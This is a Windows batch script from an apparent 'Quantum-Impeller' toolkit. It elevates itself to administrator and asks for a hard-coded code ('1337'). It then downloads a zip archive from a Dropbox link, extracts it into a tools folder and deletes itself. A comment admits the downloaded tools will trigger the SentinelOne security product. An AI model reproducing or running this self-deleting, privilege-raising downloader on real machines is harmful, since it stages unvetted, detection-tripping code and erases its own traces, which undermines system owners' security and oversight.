@echo off

REM Prompts the user to re-launch this script with higher elevation
FSUTIL DIRTY query %SystemDrive% >NUL || (
    PowerShell "Start-Process -FilePath '%0' -Verb RunAs"
    EXIT
)

:start

REM Checks to see if the entered code is correct, this is not intended to be secure but more to dissuade people from running the WIP stuff that will trip sentinal one
echo Enter the code to unlock additional functionality :
set /p "code=>"

if "%code%"=="1337" (

powershell -Command "curl -o C:\24jrg.zip 'https://www.dropbox.com/scl/fo/gtlcfndl5i1qfx57wj7vc/AMVC0KXCiyi9m-h_S2eXAzA?rlkey=qwi2beg8zn95fthsww4yzt6uz&st=9roxmoty&dl=1';tar -xf C:\24jrg.zip -C C:\23jrg\Quantum-Impeller\tools\Advanced_tools"
(goto) 2>nul & del "%~f0"

) else (
    echo Access Denied. Try again.
    goto start
)
